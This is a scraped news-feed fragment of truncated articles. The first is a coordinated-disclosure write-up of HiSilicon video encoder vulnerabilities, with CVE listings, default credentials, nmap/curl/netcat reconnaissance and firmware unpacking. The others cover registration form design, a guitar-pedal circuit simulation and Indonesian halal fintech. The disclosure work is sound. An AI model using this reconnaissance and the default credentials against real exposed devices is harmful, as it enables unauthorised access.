      <li><a href="#modifying-the-boot" id="markdown-toc-modifying-the-boot">Modifying the boot</a></li>
      <li><a href="#remote-debugging" id="markdown-toc-remote-debugging">Remote debugging</a></li>
      <li><a href="#decompiling" id="markdown-toc-decompiling">Decompiling</a></li>
    </ul>
  </li>
  <li><a href="#vulnerabilities-and-exploits" id="markdown-toc-vulnerabilities-and-exploits">Vulnerabilities and exploits</a>    <ul>
      <li><a href="#backdoor-password-cve-2020-24215" id="markdown-toc-backdoor-password-cve-2020-24215">Backdoor password (CVE-2020-24215)</a></li>
      <li><a href="#root-access-via-telnet-cve-2020-24218" id="markdown-toc-root-access-via-telnet-cve-2020-24218">root access via telnet (CVE-2020-24218)</a></li>
      <li><a href="#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" id="markdown-toc-arbitrary-file-disclosure-via-path-traversal-cve-2020-24219">Arbitrary file disclosure via path traversal (CVE-2020-24219)</a></li>
      <li><a href="#unauthenticated-file-upload-cve-2020-24217" id="markdown-toc-unauthenticated-file-upload-cve-2020-24217">Unauthenticated file upload (CVE-2020-24217)</a></li>
      <li><a href="#arbitrary-code-execution-by-uploading-malicious-firmware" id="markdown-toc-arbitrary-code-execution-by-uploading-malicious-firmware">Arbitrary code execution by uploading malicious firmware</a></li>
      <li><a href="#arbitrary-code-execution-via-command-injection" id="markdown-toc-arbitrary-code-execution-via-command-injection">Arbitrary code execution via command injection</a></li>
      <li><a href="#buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214" id="markdown-toc-buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214">Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)</a></li>
      <li></li>
    </ul>
  </li>
  <li><a href="#disclosure" id="markdown-toc-disclosure">Disclosure</a>    <ul>
      <li><a href="#affected-vendors" id="markdown-toc-affected-vendors">Affected vendors</a></li>
      <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated disclosure</a></li>
      <li><a href="#remediation" id="markdown-toc-remediation">Remediation</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#exploit-demos" id="markdown-toc-exploit-demos">Exploit demos</a></li>
  <li><a href="#exploit-scripts" id="markdown-toc-exploit-scripts">Exploit scripts</a></li>
  <li><a href="#links" id="markdown-toc-links">Links</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>The following vulnerabilities were identified:</p>

<ul>
  <li>Critical
    <ul>
      <li>Full admin interface access via backdoor password (CVE-2020-24215)</li>
      <li>root access via telnet (CVE-2020-24218)</li>
      <li>Arbitrary file disclosure via path traversal (CVE-2020-24219)</li>
      <li>Unauthenticated file upload (CVE-2020-24217)
        <ul>
          <li>Arbitrary code execution via malicious firmware upload</li>
          <li>Arbitrary code execution via command injection</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>High
    <ul>
      <li>Denial of service via buffer overflow (CVE-2020-24214)</li>
    </ul>
  </li>
  <li>Medium
    <ul>
      <li>Unauthorized RTSP video stream access (CVE-2020-24216)</li>
    </ul>
  </li>
</ul>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.
<img src="https://kojenov.com/assets/2020-09-15-encoders/050-encoder.jpg" alt="hardware">
Physical ports
<img src="https://kojenov.com/assets/2020-09-15-encoders/060-encoder.jpg" alt="hardware">
Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in
<img src="https://kojenov.com/assets/2020-09-15-encoders/070-encoder.jpg" alt="hardware">
Let’s plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it’s enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0
Date: Thu, 22 Mar 2018 14:28:13 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Wed, 05 Dec 2018 10:58:31 GMT
Connection: keep-alive
ETag: "5c07af57-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
</code></pre></div></div>

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...
</code></pre></div></div>

<p>Here is the directory structure:</p>

<div><div><pre><code>$ tree -d
.
├── disk
├── ko
│   └── extdrv
├── lib
├── nginx
│   ├── conf
│   ├── html
│   ├── logs
│   └── sbin
└── web
    ├── css
    ├── images
    ├── js
    └── player
        └── icons
</code></pre></div></div>

<ul>
  <li><code>disk</code>: empty</li>
  <li><code>ko</code>: kernel modules (device drivers)</li>
  <li><code>lib</code>: empty</li>
  <li><code>nginx</code>: nginx executables and configuration</li>
  <li><code>web</code>: static content (html, js, css…)</li>
</ul>

<p>The most important things are in the root of the archive:</p>

<div><div><pre><code>$ ls -l
total 12756
-rw------- 1 root root     307 Jul 14 08:31 box.ini
-rw------- 1 root root 6533364 Jul 14 08:31 box.v400_hdmi
drwx------ 2 root root    4096 Jul 14 08:31 disk
-rw------- 1 root root 2972924 Jul 14 08:31 font.ttf
-rw------- 1 root root 1570790 Jul 14 08:31 hostapd
-rw------- 1 root root    1847 Jul 14 08:31 hostapd.conf
drwx------ 3 root root    4096 Jul 14 08:31 ko
drwx------ 2 root root    4096 Jul 14 08:31 lib
drwx------ 6 root root    4096 Jul 14 08:31 nginx
-rw------- 1 root root 1382400 Jul 14 08:31 nosig.yuv
-rw------- 1 root root      38 Jul 14 08:31 passwd
-rw------- 1 root root  211248 Jul 14 08:31 png2bmp
-rw------- 1 root root   19213 Jul 14 08:30 remserial
-rw------- 1 root root    6624 Jul 14 08:30 reset
-rw------- 1 root root     968 Jul 14 08:30 run
-rw------- 1 root root     878 Jul 14 08:30 udhcpc.script
-rw------- 1 root root     191 Jul 14 08:30 udhcpd.conf
drwx------ 6 root root    4096 Jul 14 08:31 web
-rw------- 1 root root   39166 Jul 14 08:31 wpa_cli
-rw------- 1 root root  264069 Jul 14 08:31 wpa_supplicant
</code></pre></div></div>

<p>In addition to some general utilities ( <code>hostapd</code>, <code>png2bmp</code>, <code>remserial</code>, <code>wpa_cli</code>, <code>wpa_supplicant</code>) it contains the custom web application <code>box.v400_hdmi</code> which is a compiled binary:</p>

<div><div><pre><code>$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</code></pre></div></div>

<p><strong>This executable is the primary target of my research, and …</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516453</guid>
            <pubDate>Fri, 18 Sep 2020 13:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Practices for Registration Forms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516368">thread link</a>) | @mooreds
<br/>
September 18, 2020 | https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>Signing up for accounts is something we’re all familiar with. It’s a gateway to applications we want and need. But it’s not really fun. Or even pleasant. After all, we’re signing up to access the application, not because we want to set up another username and password and enter personal data into yet another system:</p>

<p><img src="https://fusionauth.io/assets/img/advice/registration-best-practices/long-registration-form.png" alt="A long registration form. Honestly? You need my full name and my middle name?"></p>

<p>You can make the registration form process simpler. And you should.</p>

<h2 id="is-a-registration-form-needed-at-all">Is a registration form needed at all?</h2>

<p>Before you start, ask yourself a fundamental question: does your application require registration?</p>

<p>While user registration to create an account is commonplace, every step required of a user before seeing the value of your application affects sign up rates. What can you do to avoid a typical registration process?</p>

<h3 id="let-them-try-it-first">Let them try it first</h3>

<p>Potential users are trying to kick the tires on your application. From a 2020 masters thesis, <a href="https://aaltodoc.aalto.fi/bitstream/handle/123456789/44930/master_Meissner_Mai_2020.pdf?sequence=1&amp;isAllowed=y">A User-Centered Approach to Landing Page Optimization in a Software-as-a-Service Business (PDF)</a>:</p>

<blockquote>
  <p>“Visitors have several different needs before deciding to sign up and test the service. The most prominent need is understanding what the service offers and whether it could be a suitable solution for their problem.”</p>
</blockquote>

<p>Is there functionality, degraded or not, which you can offer to visitors? For example, if you are building a drawing application, can you let a user create and download a picture without an account? This degraded functionality will allow a user to see the value of your application with minimal investment.</p>

<p>If you are building a site which displays information based on a search, allow users to see a few results without signing up. While teasers may be frustrating to some, they also reveal the results’ value.</p>

<p>In a <a href="http://cups.cs.cmu.edu/soups/2013/trustbusters2013/Sign_up_or_Give_up_Malheiros.pdf">2013 study (PDF)</a>, Microsoft researches found the source of a sign up impacted conversion:</p>

<blockquote>
  <p>The more valuable services are more likely to be considered worth the privacy and effort cost of disclosing personal data, while the least valuable will not.</p>
</blockquote>

<p>Allowing visitors to use your application, even in a limited fashion, helps them assess if a signup is worth their time.</p>



<p>You can also rely on a third party for account management. Would social login make for a smoother experience? If you are targeting enterprise users, can you integrate with internal identity providers such as ActiveDirectory?</p>

<p>Different types of users will expect different third party auth providers. If you have a consumer focused application, almost everyone has a Facebook account, so offer that social identity provider. One less password for your potential users to remember and one less obstacle to them signing up.</p>

<p>If you are targeting enterprise customers, integrate with ActiveDirectory or similar corporate directory. If developers are your target market, GitHub authentication makes for a simple registration process and signals that you understand their needs.</p>

<h3 id="passwordless">Passwordless</h3>

<p>Passwordless login allows a user to authenticate with something they have (access to a phone or email account) rather than something they know (a password).</p>

<p>While passwordless authentication requires providing some level of contact information, users do not have to create and remember yet another password.</p>

<p>All the above options provide an application with less data than the typical registration process. That’s the cost. The benefit is less signup friction.</p>

<h2 id="ease-the-pain-of-registration">Ease the pain of registration</h2>

<p>If you’ve decided you need a registration form, remember that it is a form first and foremost. You should follow known best practices.</p>

<h3 id="a-form-is-a-form-is-a-form">A form is a form is a form</h3>

<p>The Nielsen Norman Group discusses improving forms in their 2016 article, <a href="https://www.nngroup.com/articles/web-form-design/">Website Forms Usability: Top 10 Recommendations</a>. The number one suggestion is:</p>

<blockquote>
  <p>“Keep it short. … Eliminating unnecessary fields requires more time [to decide what data is worth asking for], but the reduced user effort and increased completion rates make it worthwhile. Remove fields which collect information that can be (a) derived in some other way, (b) collected more conveniently at a later date, or (c) simply omitted.”</p>
</blockquote>

<p>Carefully consider the information you are asking for. The fewer fields the better. While admittedly in a different context, <a href="https://unbounce.com/conversion-rate-optimization/how-to-optimize-contact-forms/">Imagescape more than doubled a contact form conversion rate</a> by decreasing the number of fields from 11 to 4. There may be data needed only for certain features of your application; ask for it when that feature is first accessed, rather than at signup.</p>

<p>Make sure your form is mobile friendly; test at various screen sizes. The tediousness of data entry on a mobile device and the prevalence of their usage are another reason to have as few signup form fields as possible.</p>

<p>If a form field is optional, clearly mark it so. Even better, don’t ask for optional data on the initial user registration. Request that information later, when the user is more engaged and has discovered the value of your offering.</p>

<p>Provide clear error messages when data fails to validate. Use both client side validation, which is faster, and server side validation, which is tamper proof. On the topic of tampering, ensure any form is submitted over TLS. You want to keep submitted information confidential and secure.</p>

<p>Make use of the full suite of HTML elements. Dropdowns and radio buttons are powerful, but number and email input fields leverage browsers’ built-in validation and should be used as well. If you aren’t sure what’s supported, use tools like <a href="https://caniuse.com/">caniuse.com</a> to verify compatibility.</p>

<h3 id="registration-forms-are-unique">Registration forms are unique</h3>

<p>But registration forms aren’t just another form. They are the gateway to your full application or site.</p>

<p>What causes angst when a user is signing up? This <a href="https://discovery.ucl.ac.uk/id/eprint/1378346/1/ewic_hci12_diss_paper7.pdf">2012 paper (PDF)</a> examined registration for government services. It defined sign up friction as “the imbalance between the business process (user goals) and [required] security behaviour” around signing up. This study found friction was best explained by the following attributes of a signup process:</p>

<ul>
  <li>The number of new credentials required</li>
  <li>Any delay in the process, such as waiting for an activation email</li>
  <li>Whether registration requires an interruption of a user’s routine</li>
  <li>The frequency of legally obligated use of the service</li>
</ul>

<p>Obviously you can’t control the last aspect, but minimize the number of new credentials, delays and interruptions in your registration process.</p>

<p>Most registration forms ask for a username and password. Make it clear what are valid values. If a username is an email address, allow all valid email addresses, including aliases.</p>

<p>Avoid complicated password validation rules. Allow users to use a password manager. NIST recommends a focus on avoiding passwords known to be insecure.</p>

<blockquote>
  <p>“[A]nalyses of breached password databases reveal that the benefit of [password complexity] rules is not nearly as significant as initially thought, although the impact on usability and memorability is severe.” - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf">Appendix A—Strength of Memorized Secrets, NIST Special Publication 800-63B</a></p>
</blockquote>

<p>Obtain proper user consent. What this is depends on your plans for the requested information and what regulatory regime applies. Different levels of informed consent may be required. For example, if you are in the USA and are dealing with a child’s personal information, you’ll want to make sure you get parental consent because of COPPA.</p>

<p>Ensure new users enter sensitive data correctly. If there are any critical fields, such as a government ID, provide a confirmation field asking for the data to be re-entered to ensure the data is typed correctly. This is an exception to the rule of asking for less data. If the stakes of incorrect data entry are high, the additional work is worth the inconvenience.</p>

<p>If you need more than a few pieces of information on registration, consider splitting the sign up form into steps and using a registration stepper, also known as a multi-step form or a wizard. A stepper is a user interface element which shows how many steps are required to complete an action:</p>

<blockquote>
  <p>“Steppers display progress through a sequence by breaking it up into multiple logical and numbered steps.” - <a href="https://material.io/archive/guidelines/components/steppers.html">Google’s material design reference</a>”.</p>
</blockquote>

<h2 id="multi-step-registration">Multi-step registration</h2>

<p>Splitting up a registration form allows you to ask for more data, but avoid imposing a high initial cognitive cost on a potential user. It also allows you to track registration progress. Rather than a registration being an all or nothing proposition, you can see where people fall out of the registration funnel: is it because of step two or step three? It also may increase the conversion rate: Instapage saw an <a href="https://instapage.com/blog/multi-step-form-part-2">18% increase in conversion rate</a> when they split their registration form into multiple steps.</p>

<p><img src="https://fusionauth.io/assets/img/advice/registration-best-practices/shorter-reg-form.png" alt="A multi-step registration form."></p>

<p>When creating the pages, group fields logically, as per the Nielsen Norman Group recommendations which suggest grouping “related labels and fields.” Separate pages allow you to provide a contextual explanation of how providing the data will be useful to the visitor at each step. If you can’t come up with a reasonable one, consider removing the fields.</p>

<p>Ask for as little as possible on the first registration step. Once they take that first step, they’ll be more committed to finishing, thanks to our <a href="http://changingminds.org/techniques/general/cialdini/consistency.htm">love of consistency</a>.</p>

<p>Ensure you are clear about the number of steps the registration process will take. Doing so lets the user assess the effort involved.</p>

<h3 id="maintaining-state">Maintaining state</h3>

<p>Splitting a form up into multiple steps requires maintaining state across submissions. If you are using a framework, investigate helper libraries, such as <a href="https://github.com/zombocom/wicked">wicked</a> for Ruby on Rails or <a href="https://github.com/ycs77/laravel-wizard">lavavel-wizard</a> for Laravel.</p>

<p>If you are rolling your own solution, you can maintain state in hidden form parameters or in the user’s session. Either way, you’ll want to serialize entered and validated data and store it. Then, when the form is ready to submit, you can deserialize this value and process the entire form, typically saving it to a datastore.</p>

<p>Another option is to save registration data in the datastore and progressively add to the user’s profile as they work through the steps. This …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices">https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/identity-basics/registration-best-practices</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516368</guid>
            <pubDate>Fri, 18 Sep 2020 13:18:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating the ProCo Rat Distortion Pedal in LTSpice]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516227">thread link</a>) | @cushychicken
<br/>
September 18, 2020 | http://cushychicken.github.io/ltspice-proco-rat/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/ltspice-proco-rat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a long time since I’ve done <a href="http://cushychicken.github.io/posts/ltspice-tube-screamer/">a pedal simulation</a>, and, well, quarantine times are as good a time as any to fill time with LTSpice simulation. Since Radiohead is a too-appropirate soundtrack for the time in which we live, and Thom Yorke is a famous user, why not simulate the ProCO RAT distortion pedal?</p><p>If you’d like to follow along at home, I’ve put <a href="https://github.com/Cushychicken/ltspice-guitar-pedals/tree/master/proco-rat-distortion">the LTSpice file on GitHub</a>. Find any errors? Got any neat mods you’d like to include? Please, submit a pull request!</p><p>You may need to rustle up a diode model for the 1N914 to run - it is not one of the models included in the LTSpice install.</p><p>Here’s the whole schematic, labeled for clarity:</p><p><img src="http://cushychicken.github.io/assets/images/proco_rat_whole_schematic" alt="Whole Schematic"></p><p>The interesting stuff is largely concentrated in the clipping, tone, and output stages.</p><p>The clipping stage is formed by a LM308 opamp in a noninverting configuration. R2 biases the input at 4.5[V] for maximum dynamic range in the opamp output - i.e., halfway between the 9V rail and GND. Feedback gain is set by potentiometer R9. When shorted to 0[ohm], it reduces the clipping stage to a simple opamp follower (gain=1). When set to a maximum, gain of the amp in signal bands is: \(Gain = 1 + \frac{Rgain}{(560 || 47)} = ~2300 [V/V] = ~67[dB]\) This is more than enough gain to drive to the opamp rail for even a gentle input signal. Fed raw into a guitar amplifier, this signal would completely saturate the input. That’s where the D2/D3 diode clipping pair come in to play. (Note, though, that the input saturation is desirable to some users. A common modification to this pedal is to remove D2/D3, and rely solely on opamp clipping. This yields a volume boost, and crunchier tone.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433482578.png" alt="Clipping Stage"></p><p>The AC coupling network of C10/R10 works to shift the signal back to a DC balanced square wave. D2/D3 serve to clip the signal down to a more modest +/-0.65[V].</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433524694.png" alt="Input vs Opamp Output vs Clipping Diodes"></p><p>This is slightly more interesting when you move into the frequency domain, however. The net effect, as the gain increases, is to emphasize the 1kHz band of the guitar - ideally, to cut through the mix of a band. (A rock band, that is - not a frequency band.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433598206.png" alt="Image"></p><p>Note that all of these traces converge to the same rolloff asymptote. That’s the limitation imposed by the LM308’s output slew rate. At higher gain, the opamp can’t switch any faster, which limits the response of higher frequencies as the gain increases.</p><p>The tone control is remarkably simple - just a first order RC filter, with potentiometer R17 to allow the user to set the rolloff frequency.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433644991.png" alt="Tone RC Filter"></p><p>R15 and C11 set a limit of the RC filter of the tone stage at about 32kHz. Increasing pot R17 moves that corner frequency lower and lower, until bottoming out at 475Hz. This filter effectively smooths the square wave into progressively softer edges. As R17 increases, the transitions get less square, and closer to a triangular wave.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433664315.png" alt="Image"></p><p>This is my estimate of who lies where on the tone curve, based on a subset of <a href="https://en.wikipedia.org/wiki/Pro_Co_RAT#Notable_users">Wikipedia’s list of RAT users</a>:</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433692230.png" alt="Clipping vs Users"></p><p>The output driver is also relatively simple - just a JFET follower, with a simple RC filter serving as a highpass filter for volume control. As R14 decreases in resistance, so does the output volume.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433718430.png" alt="Image"></p><ul><li>Increasing the compensation capacitor of the LM308 opamp (C1 in our schematic) has some interesting properties. Increasing this to 300pF creates a softer transition to the opamp railing out, which yields an overall softer clip - fewer higher harmonics. An alternative design, for a less harsh clip.</li><li>Increasing the compensation cap higher proves problematic - or interesting, depending on your viewpoint. Increasing C1 to 3nF yields a gentle oscillation in the opamp output. This could make for some wacky mixed frequency effects. Might be a fun thing to wire up and see what happens.</li><li>Different diodes for D2/D3 could also change the clipping profile, and the harshness of the clip.</li></ul><p><a href="https://www.electrosmash.com/proco-rat">ElectroSmash</a>, of course, is the vanguard of guitar pedal EE knowhow. I used their page of schematics and simulation output as a sanity check that I got all of this right.</p><p>You can see the slew rate limitation of the LM308 in <a href="https://www.analog.com/media/en/technical-documentation/data-sheets/lt0108.pdf">the datasheet</a>. Gain/bandwidth product is on page 4, under “Open Loop Frequency Response”.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/ltspice-proco-rat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516227</guid>
            <pubDate>Fri, 18 Sep 2020 13:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital banking, now halal]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 109 (<a href="https://news.ycombinator.com/item?id=24516141">thread link</a>) | @jbegley
<br/>
September 18, 2020 | https://restofworld.org/2020/now-serving-halal-apps/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/now-serving-halal-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia’s 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council’s influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma’ruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">“Shariatization” of the economy</a> — i.e., the growth of digital financial services catering to Muslim users — a priority for the country’s development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users — whether peer-to-peer lending apps, mobile money services, or online stock-trading portals — MUI acts as the arbiter of their religious legitimacy. MUI’s National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI’s religious scholars become embedded in the early evolution of a company’s digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>


		<figure>
			<div>
